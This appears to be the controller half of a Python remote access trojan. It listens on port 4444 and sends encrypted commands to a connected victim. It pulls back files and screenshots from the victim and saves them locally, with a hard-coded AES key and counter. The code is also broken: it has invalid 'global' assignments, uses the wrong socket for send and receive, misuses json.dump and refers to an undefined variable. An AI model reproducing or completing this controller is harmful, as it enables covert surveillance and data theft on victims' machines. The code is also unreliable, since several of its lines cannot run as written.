#!/usr/bin/python

import socket
import json
import base64
from Crypto.Cipher import AES

global counter = 5432141252624321
global key = 12345678901234567890123456789012


def encrypt(message):
	encrypto = AES.new(key,AES.MODE_CTR, counter=lambda: counter)
	return encrypto.encrypt(message)
def decrypt(message):
	decrypto = AES.new(key,AES.MODE_CTR,counter=lambda: counter)
	return decrypto.decrypt(message)

Tcpsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Tcpsocket.bind(("127.0.0.1",4444))
Tcpsocket.listen(1)
print("Waiting for incoming connection on port 4444")
(clientsocket, address) = Tcpsocket.accept()
print(decrypt(Tcpsocket.recv(1024)))

while True:
	command = input("***")
	command_json_encoded = json.dump(command)
	Tcpsocket.sendall(encrypt(command_json_encoded))
	print("Waiting for response")
	result = decrypt(Tcpsocket.recv(1024))
	result_json_decoded = json.loads(result)
	if "download" in command:
		result_json_b64_decoded = base64.b64decode(result_json_decoded)
		file = open(str(command_splited[1]),"wb")
		file.write(bytes(result_json_b64_decoded))
		file.close()
		print("Download Successful")
	if "screencapture" in command:
		result_json_b64_decoded = base64.b64decode(result_json_decoded)
		file = open("Screencapture.jpg","wb")
		file.write(bytes(result_json_b64_decoded))
		file.close()
		print("Screenshot succesfully saved")
	print(str(result_json_decoded))





